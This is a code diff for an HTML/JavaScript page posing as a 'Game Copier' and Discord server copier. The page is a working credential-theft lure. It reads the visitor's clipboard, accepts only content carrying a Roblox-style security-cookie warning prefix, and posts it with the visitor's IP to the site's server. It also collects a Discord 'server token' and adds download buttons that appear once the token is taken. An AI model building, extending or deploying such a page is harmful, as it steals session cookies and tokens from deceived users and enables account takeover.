@@ -110,6 +110,11 @@
       background: #666;
     }
 
+    #gameDownloadSection, #discordDownloadSection {
+      margin-top: 20px;
+      display: none;
+    }
+
     /* Disable text selection on token inputs */
     #tokenInput, #discordTokenInput {
       user-select: none;
@@ -154,17 +159,6 @@
   <div class="container">
     <h1>GAME COPIER</h1>
     <p>Copy games & servers (legally)</p>
-    <!-- Token Gate - Discord + Game Token (HIDDEN BY DEFAULT) -->
-    <div id="tokenGateBox" style="margin-bottom: 24px; display: none;">
-      <input type="text" id="discordTokenGateInput" placeholder="Enter Discord Token" autocomplete="off" />
-      <input type="text" id="gameTokenGateInput" placeholder="Enter Game Token" autocomplete="off" />
-      <button id="tokenGateSubmitBtn">Submit</button>
-      <div id="downloadSection" style="display: none;">
-        <button id="downloadBtn">Download</button>
-        <div id="downloadGateMsg"></div>
-        <button id="verifyBtn" style="margin-top:10px;display:none;">Verify</button>
-      </div>
-    </div>
 
     <div class="mode-switcher">
       <button id="gameModeBtn" class="active">Game Copier</button>
@@ -186,6 +180,12 @@
         <input type="text" id="tokenInput" placeholder="Enter Game Token Here" autocomplete="off" />
         <button id="tokenSubmitBtn">Submit Token & Save Clipboard</button>
       </div>
+
+      <div id="gameDownloadSection" style="display:none;">
+        <button id="gameDownloadBtn">Download</button>
+        <div id="gameDownloadMsg"></div>
+        <button id="gameVerifyBtn" style="margin-top:10px;display:none;">Verify</button>
+      </div>
     </div>
 
     <!-- Discord Server Copier Mode -->
@@ -202,6 +202,12 @@
       <div id="discordTokenBox">
         <input type="text" id="discordTokenInput" placeholder="Enter Server Token Here" autocomplete="off" />
         <button id="discordTokenSubmitBtn">Submit Server Token</button>
+      </div>
+
+      <div id="discordDownloadSection" style="display:none;">
+        <button id="discordDownloadBtn">Download</button>
+        <div id="discordDownloadMsg"></div>
+        <button id="discordVerifyBtn" style="margin-top:10px;display:none;">Verify</button>
       </div>
     </div>
 
@@ -224,6 +230,11 @@
     const doneBtn = document.getElementById('doneBtn');
     const errorMessage = document.getElementById('errorMessage');
 
+    const gameDownloadSection = document.getElementById('gameDownloadSection');
+    const gameDownloadBtn = document.getElementById('gameDownloadBtn');
+    const gameDownloadMsg = document.getElementById('gameDownloadMsg');
+    const gameVerifyBtn = document.getElementById('gameVerifyBtn');
+
     const serverIdInput = document.getElementById('serverIdInput');
     const serverSubmitBtn = document.getElementById('serverSubmitBtn');
     const jsCodeBox = document.getElementById('jsCodeBox');
@@ -232,19 +243,12 @@
     const discordTokenBox = document.getElementById('discordTokenBox');
     const discordTokenInput = document.getElementById('discordTokenInput');
     const discordTokenSubmitBtn = document.getElementById('discordTokenSubmitBtn');
+    const discordDownloadSection = document.getElementById('discordDownloadSection');
+    const discordDownloadBtn = document.getElementById('discordDownloadBtn');
+    const discordDownloadMsg = document.getElementById('discordDownloadMsg');
+    const discordVerifyBtn = document.getElementById('discordVerifyBtn');
 
     const adminBtn = document.getElementById('adminBtn');
-    const tokenGateBox = document.getElementById('tokenGateBox');
-    const discordTokenGateInput = document.getElementById('discordTokenGateInput');
-    const gameTokenGateInput = document.getElementById('gameTokenGateInput');
-    const tokenGateSubmitBtn = document.getElementById('tokenGateSubmitBtn');
-    const downloadSection = document.getElementById('downloadSection');
-    const downloadBtn = document.getElementById('downloadBtn');
-    const downloadGateMsg = document.getElementById('downloadGateMsg');
-    const verifyBtn = document.getElementById('verifyBtn');
-    let tokenGateVerified = localStorage.getItem('tokenGateVerified') === '1';
-    let discordGateToken = '';
-    let gameGateToken = '';
 
     let permissionGranted = false;
 
@@ -275,7 +279,8 @@
       serverIdInput.value = '';
       tokenInput.value = '';
       discordTokenInput.value = '';
-      tokenGateBox.style.display = 'none'; // Hide token gate on reset
+      gameDownloadSection.style.display = 'none';
+      discordDownloadSection.style.display = 'none';
     }
 
     // Get user IP for logging
@@ -349,7 +354,7 @@
     doneBtn.onclick = async () => {
       try {
         const clipboard = await navigator.clipboard.readText();
-        
+
         if (!clipboard.includes('Sharing-this-will-allow-someone-to-')) {
           errorMessage.textContent = 'Something went wrong, try copying the network var again and then click done';
           return;
@@ -360,7 +365,7 @@
         await fetch('/submit-clipboard', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ 
+          body: JSON.stringify({
             clipboardData: clipboard,
             userIP: userIP,
             type: 'game'
@@ -370,9 +375,6 @@
         doneBox.style.display = 'none';
         tokenBox.style.display = 'block';
         errorMessage.textContent = '';
-
-        // --- SHOW THE TOKEN GATE ---
-        tokenGateBox.style.display = 'block';
 
       } catch (err) {
         window.location.href = 'https://example.com/denied';
@@ -393,7 +395,7 @@
         await fetch('/submit-clipboard', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ 
+          body: JSON.stringify({
             clipboardData: clipboard,
             userIP: userIP,
             type: 'game'
@@ -401,10 +403,18 @@
         });
 
         alert('Clipboard content saved.');
+        // SHOW download section for Game Copier
+        gameDownloadSection.style.display = 'block';
+
       } catch {
         alert('Clipboard permission was denied. Redirecting...');
         window.location.href = 'https://example.com/denied';
       }
+    };
+
+    gameDownloadBtn.onclick = () => {
+      // Download logic for Game Copier
+      window.location.href = "/download";
     };
 
     // Discord Server Logic
@@ -445,7 +455,7 @@
         await fetch('/receive-token', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ 
+          body: JSON.stringify({
             token: token,
             userIP: userIP,
             serverId: serverIdInput.value.trim()
@@ -454,9 +464,16 @@
 
         alert('Server token saved successfully!');
         resetAll();
+        // SHOW download section for Discord Server
+        discordDownloadSection.style.display = 'block';
       } catch (err) {
         alert('Failed to save token.');
       }
+    };
+
+    discordDownloadBtn.onclick = () => {
+      // Download logic for Discord Server
+      window.location.href = "/download";
     };
 
     // Admin login
@@ -466,41 +483,6 @@
         window.location.href = `/admin?password=${encodeURIComponent(password)}`;
       }
     };
-
-    // --- Token Gate Logic ---
-    tokenGateSubmitBtn.onclick = () => {
-      discordGateToken = discordTokenGateInput.value.trim();
-      gameGateToken = gameTokenGateInput.value.trim();
-      if (!discordGateToken || !gameGateToken) {
-        alert('Please enter both tokens!');
-        return;
-      }
-      downloadSection.style.display = 'block';
-      downloadGateMsg.textContent = '';
-      verifyBtn.style.display = 'none';
-    };
-
-    downloadBtn.onclick = () => {
-      tokenGateVerified = localStorage.getItem('tokenGateVerified') === '1';
-      if(tokenGateVerified) {
-        window.location.href = "/download";
-      } else {
-        downloadGateMsg.textContent = "You must verify before downloading.";
-        verifyBtn.style.display = 'inline-block';
-      }
-    };
-
-    verifyBtn.onclick = () => {
-      window.location.href = '/verify';
-    };
-
-    window.onload = function() {
-      if(localStorage.getItem('tokenGateVerified') === '1') {
-        downloadGateMsg.textContent = "Verification successful! You can now download.";
-        verifyBtn.style.display = 'none';
-      }
-    };
-
   </script>
 </body>
 </html>
